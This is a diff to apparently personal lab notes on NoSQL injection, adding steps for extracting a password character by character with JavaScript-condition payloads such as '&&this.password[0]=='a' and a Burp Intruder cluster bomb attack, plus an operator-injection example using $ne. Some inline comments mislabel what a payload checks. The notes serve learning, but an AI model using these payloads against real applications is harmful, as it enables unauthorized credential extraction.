@@ -118,14 +118,10 @@ we send the payload = `'administrator'&&1=='1'` -  and we are still able to retr
 '&&username[0]=='a  -  checks if 0th index of username == a
 '%26%26this.password[0]=='a  -  checks if 0th index of password == a
 '%26%26this.password.length=='1  -  checks if 0th index of username == a
-'%26%26this.password[0]=='a  -  checks if 0th index of username == a
-
 ```
+putting the request in intruder[[burpsuite]] and by using a cluster bomb attack we could cycle through numbers in the index of the password, and also cycle the alphabets from a to z
+by seeing a sudden change in the length of the response we note that, that particular alphabet corresponding to the index is in the password
 sbpknkpr
-
-
-
-
 ## NoSQL operator injection
 
 in JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`
